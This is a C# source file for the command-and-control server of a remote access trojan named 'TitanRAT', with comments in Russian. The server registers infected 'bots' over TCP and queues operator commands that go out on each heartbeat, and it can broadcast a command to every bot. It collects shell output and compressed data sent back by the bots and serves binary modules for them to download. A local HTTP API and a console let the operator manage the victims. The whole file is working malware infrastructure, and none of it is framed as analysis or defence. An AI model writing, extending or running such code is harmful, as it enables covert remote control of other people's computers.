// Server/Program.cs — добавлен DELETE /responses для очистки логов
using TitanRAT.Server;
using System.Net;
using System.Net.Sockets;
using System.Collections.Concurrent;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Runtime.InteropServices;

public static class Win32Decompress
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint RtlDecompressBuffer(
        ushort CompressionFormat,
        IntPtr UncompressedBuffer,
        uint UncompressedBufferSize,
        IntPtr CompressedBuffer,
        uint CompressedBufferSize,
        out uint FinalUncompressedSize);

    private const ushort COMPRESSION_FORMAT_XPRESS = 0x0003;

    public static string Decompress(string base64Payload)
    {
        try
        {
            byte[] compressed = Convert.FromBase64String(base64Payload);
            uint maxOutSize = Math.Max((uint)compressed.Length * 8, 2 * 1024 * 1024);
            IntPtr outBuf = Marshal.AllocHGlobal((int)maxOutSize);
            IntPtr inBuf = Marshal.AllocHGlobal(compressed.Length);
            try
            {
                Marshal.Copy(compressed, 0, inBuf, compressed.Length);
                uint resultSize;
                uint status = RtlDecompressBuffer(COMPRESSION_FORMAT_XPRESS, outBuf, maxOutSize, inBuf, (uint)compressed.Length, out resultSize);
                if (status == 0)
                {
                    byte[] result = new byte[resultSize];
                    Marshal.Copy(outBuf, result, 0, (int)resultSize);
                    return Encoding.UTF8.GetString(result);
                }
                return $"[DECOMPRESS_ERR: 0x{status:X}]";
            }
            finally
            {
                Marshal.FreeHGlobal(inBuf);
                Marshal.FreeHGlobal(outBuf);
            }
        }
        catch (Exception ex) { return $"[DECOMPRESS_EX: {ex.Message}]"; }
    }
}

// Класс для передачи ответов в панель
public class ResponseEntry
{
    [JsonPropertyName("time")]
    public string Time { get; set; } = "";
    [JsonPropertyName("hostname")]
    public string Hostname { get; set; } = "";
    [JsonPropertyName("message")]
    public string Message { get; set; } = "";
}

class Program
{
    private static readonly MessageReassembler _reassembler = new();
    private static readonly ConcurrentDictionary<string, ClientSession> _clients = new();
    private static readonly ConcurrentQueue<ResponseEntry> _responseQueue = new(); // очередь ответов для панели
    private const int MaxResponseQueue = 500;
    private static volatile bool _running = true;
    private const int TcpPort = 12345;
    private const int HttpPort = 12346;
    private static readonly CancellationTokenSource _httpCts = new();

    static async Task Main(string[] args)
    {
        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
        Console.OutputEncoding = Encoding.UTF8;

        Console.WriteLine($"[C2] Starting TCP server on port {TcpPort}...");
        Console.WriteLine($"[C2] Starting HTTP API on port {HttpPort}...");
        var tcpListener = new TcpListener(IPAddress.Any, TcpPort);
        tcpListener.Start();
        var tcpTask = Task.Run(() => AcceptTcpClientsAsync(tcpListener));
        var httpTask = Task.Run(() => RunHttpApiAsync(_httpCts.Token));
        await HandleConsoleInputAsync();
        _running = false;
        _httpCts.Cancel();
        tcpListener.Stop();
        foreach (var session in _clients.Values) session.Close();
        await Task.WhenAll(tcpTask, httpTask);
    }

    private static async Task AcceptTcpClientsAsync(TcpListener listener)
    {
        while (_running)
        {
            try
            {
                var client = await listener.AcceptTcpClientAsync();
                _ = Task.Run(() => HandleClientAsync(client));
            }
            catch when (_running) { }
        }
    }

    private static async Task HandleClientAsync(TcpClient client)
    {
        var session = new ClientSession(Guid.NewGuid().ToString(), client);
        try
        {
            // Бинарное HELLO
            var raw = await session.ReadBinaryAsync();
            if (raw == null) return;
            if (Encoding.UTF8.GetString(raw) != "HELLO") { session.Close(); return; }
            await session.SendBinaryAsync(Encoding.UTF8.GetBytes("ACK"));

            // Бинарная регистрация
            raw = await session.ReadBinaryAsync();
            if (raw == null) return;
            string reg = Encoding.UTF8.GetString(raw);
            if (!reg.StartsWith("REGISTER:")) { session.Close(); return; }
            session.Hostname = reg["REGISTER:".Length..];
            _clients[session.Id] = session;
            string connectMsg = $"[+] Bot connected: {session.Hostname} ({session.Id})";
            Console.WriteLine(connectMsg);
            AddResponseEntry("system", connectMsg);

            await session.SendBinaryAsync(Encoding.UTF8.GetBytes($"ID:{session.Id}"));

            while (_running)
            {
                raw = await session.ReadBinaryAsync();
                if (raw == null) break;
                string line = Encoding.UTF8.GetString(raw);
                if (string.IsNullOrWhiteSpace(line)) continue;

                session.LastSeen = DateTime.UtcNow;

                if (line.StartsWith("BEAT:") || line == "pong")
                {
                    var cmd = session.GetPendingCommand();
                    if (cmd != null)
                    {
                        string sendMsg = $"[>] Sending queued command to {session.Id}: {cmd}";
                        Console.WriteLine(sendMsg);
                        AddResponseEntry("system", sendMsg);
                        await session.SendBinaryAsync(Encoding.UTF8.GetBytes(cmd));
                    }
                }
                else
                {
                    // Обработка сжатия
                    if (line.StartsWith("XPRESS:"))
                    {
                        var b64Data = line.Substring(7);
                        var decompressed = Win32Decompress.Decompress(b64Data);
                        if (!decompressed.StartsWith("[DECOMPRESS"))
                        {
                            line = decompressed;
                            Console.WriteLine($"[SERVER] Decompressed {b64Data.Length}b -> {line.Length}b");
                        }
                        else
                        {
                            Console.WriteLine($"[SERVER] {decompressed}");
                            continue;
                        }
                    }

                    // Обработка shell вывода
                    if (line.StartsWith("SHELL_OUT:"))
                    {
                        string utf8Text = line.Substring(10);
                        AddResponseEntry(session.Hostname, utf8Text);
                        Console.WriteLine($"[RESPONSE] {session.Id}: {utf8Text}");
                        continue;
                    }

                    // Обычные ответы (pong, MODULE_LOADED_OK и т.п.)
                    AddResponseEntry(session.Hostname, line);
                    Console.WriteLine($"[RESPONSE] {session.Id}: {line}");

                    session.AddResponse(line);
                    var assembled = _reassembler.Process(session.Id, line);
                    if (assembled != null)
                    {
                        Console.WriteLine($"[RESPONSE] {session.Id}: {assembled}");
                    }
                }
            }
        }
        catch (Exception ex)
        {
            string errMsg = $"[!] Error handling {session.Id}: {ex.Message}";
            Console.WriteLine(errMsg);
            AddResponseEntry("system", errMsg);
        }
        finally
        {
            _clients.TryRemove(session.Id, out _);
            session.Close();
            string disconnectMsg = $"[-] Bot disconnected: {session.Hostname}";
            Console.WriteLine(disconnectMsg);
            AddResponseEntry("system", disconnectMsg);
        }
    }

    private static void AddResponseEntry(string hostname, string message)
    {
        var entry = new ResponseEntry
        {
            Time = DateTime.Now.ToString("HH:mm:ss"),
            Hostname = hostname,
            Message = message
        };
        _responseQueue.Enqueue(entry);
        while (_responseQueue.Count > MaxResponseQueue) _responseQueue.TryDequeue(out _);
    }

    private static async Task RunHttpApiAsync(CancellationToken token)
    {
        var listener = new HttpListener();
        listener.Prefixes.Add($"http://localhost:{HttpPort}/");
        listener.Prefixes.Add($"http://127.0.0.1:{HttpPort}/");
        listener.Start();
        try
        {
            while (!token.IsCancellationRequested)
            {
                var context = await listener.GetContextAsync().WaitAsync(token);
                _ = Task.Run(() => HandleHttpRequestAsync(context), token);
            }
        }
        catch (OperationCanceledException) { }
        finally { listener.Stop(); }
    }

    private static async Task HandleHttpRequestAsync(HttpListenerContext context)
    {
        var request = context.Request;
        var response = context.Response;
        try
        {
            var path = request.Url?.AbsolutePath ?? "/";
            var method = request.HttpMethod.ToUpper();
            if (method == "GET" && path == "/clients")
            {
                var clients = _clients.Values.Select(c => new { id = c.Id, hostname = c.Hostname, lastSeen = c.LastSeen.ToString("o"), queueSize = c.QueueSize }).ToArray();
                await SendJsonAsync(response, clients);
            }
            else if (method == "GET" && path == "/responses")
            {
                var responses = _responseQueue.Reverse().ToArray();
                await SendJsonAsync(response, responses);
            }
            else if (method == "DELETE" && path == "/responses")
            {
                while (_responseQueue.TryDequeue(out _)) { }
                await SendJsonAsync(response, new { success = true, message = "All responses cleared" });
            }
            else if (method == "POST" && path == "/send")
            {
                using var reader = new StreamReader(request.InputStream, request.ContentEncoding);
                var body = await reader.ReadToEndAsync();
                var payload = JsonSerializer.Deserialize<SendPayload>(body);
                if (payload != null && _clients.TryGetValue(payload.BotId, out var session))
                {
                    session.EnqueueCommand(payload.Command);
                    string queueMsg = $"[>] Command queued for {payload.BotId}: {payload.Command}";
                    Console.WriteLine(queueMsg);
                    AddResponseEntry("system", queueMsg);
                    await SendJsonAsync(response, new { success = true, message = "Command queued" });
                }
                else
                {
                    response.StatusCode = 404;
                    await SendJsonAsync(response, new { error = "Bot not found" });
                }
            }
            else if (method == "GET" && path.StartsWith("/results/"))
            {
                var botId = path["/results/".Length..];
                if (_clients.TryGetValue(botId, out var session))
                {
                    var results = session.GetRecentResponses(20).ToArray();
                    await SendJsonAsync(response, new { bot_id = botId, results });
                }
                else
                {
                    response.StatusCode = 404;
                    await SendJsonAsync(response, new { error = "Bot not found" });
                }
            }
            else if (method == "GET" && path.StartsWith("/modules/") && path.EndsWith(".bin"))
            {
                var moduleName = path["/modules/".Length..];
                var modulePath = Path.Combine("modules", moduleName);
                if (File.Exists(modulePath))
                {
                    var fileBytes = await File.ReadAllBytesAsync(modulePath);
                    response.ContentType = "application/octet-stream";
                    response.ContentLength64 = fileBytes.Length;
                    await response.OutputStream.WriteAsync(fileBytes, 0, fileBytes.Length);
                }
                else
                {
                    response.StatusCode = 404;
                    await SendJsonAsync(response, new { error = "Module not found" });
                }
            }
            else
            {
                response.StatusCode = 404;
                await SendJsonAsync(response, new { error = "Not found" });
            }
        }
        catch (Exception ex)
        {
            response.StatusCode = 500;
            await SendJsonAsync(response, new { error = ex.Message });
        }
        finally
        {
            response.Close();
        }
    }

    private static async Task SendJsonAsync(HttpListenerResponse response, object data)
    {
        var json = JsonSerializer.Serialize(data);
        var bytes = Encoding.UTF8.GetBytes(json);
        response.ContentType = "application/json";
        response.ContentLength64 = bytes.Length;
        await response.OutputStream.WriteAsync(bytes, 0, bytes.Length);
    }

    private static async Task HandleConsoleInputAsync()
    {
        while (_running)
        {
            var input = Console.ReadLine();
            if (string.IsNullOrWhiteSpace(input)) continue;
            var parts = input.Split(' ', 3);
            var cmd = parts[0].ToLower();
            switch (cmd)
            {
                case "list":
                    Console.WriteLine("\n[Connected Bots]");
                    Console.WriteLine($"{"ID",-36} {"Hostname",-20} {"Last Seen"} {"Queue"}");
                    Console.WriteLine(new string('-', 75));
                    foreach (var c in _clients.Values)
                        Console.WriteLine($"{c.Id,-36} {c.Hostname,-20} {c.LastSeen:HH:mm:ss} {c.QueueSize}");
                    Console.WriteLine();
                    break;
                case "send":
                    if (parts.Length < 3) { Console.WriteLine("Usage: send <id> <command>"); break; }
                    if (_clients.TryGetValue(parts[1], out var target))
                    {
                        target.EnqueueCommand(parts[2]);
                        Console.WriteLine($"[>] Command queued for {parts[1]}: {parts[2]}");
                    }
                    else { Console.WriteLine($"[!] Bot {parts[1]} not found"); }
                    break;
                case "queue":
                    if (parts.Length < 2) { Console.WriteLine("Usage: queue <id>"); break; }
                    if (_clients.TryGetValue(parts[1], out var qSession))
                    {
                        Console.WriteLine($"\n[Queue for {parts[1]}] (size: {qSession.QueueSize})");
                        Console.WriteLine("(Commands are delivered on next heartbeat)");
                    }
                    else { Console.WriteLine($"[!] Bot {parts[1]} not found"); }
                    break;
                case "clear_queue":
                    if (parts.Length < 2) { Console.WriteLine("Usage: clear_queue <id>"); break; }
                    if (_clients.TryGetValue(parts[1], out var cSession))
                    {
                        cSession.ClearQueue();
                        Console.WriteLine($"[>] Queue cleared for {parts[1]}");
                    }
                    else { Console.WriteLine($"[!] Bot {parts[1]} not found"); }
                    break;
                case "broadcast":
                    if (parts.Length < 2) { Console.WriteLine("Usage: broadcast <command>"); break; }
                    foreach (var c in _clients.Values) c.EnqueueCommand(parts[1]);
                    Console.WriteLine($"[>] Command broadcast to {_clients.Count} bots");
                    break;
                case "quit":
                    Console.WriteLine("[*] Shutting down...");
                    _running = false;
                    break;
                default:
                    Console.WriteLine($"[!] Unknown command: {cmd}");
                    break;
            }
        }
    }
}

class SendPayload
{
    [JsonPropertyName("bot_id")]
    public string BotId { get; set; } = "";
    [JsonPropertyName("command")]
    public string Command { get; set; } = "";
}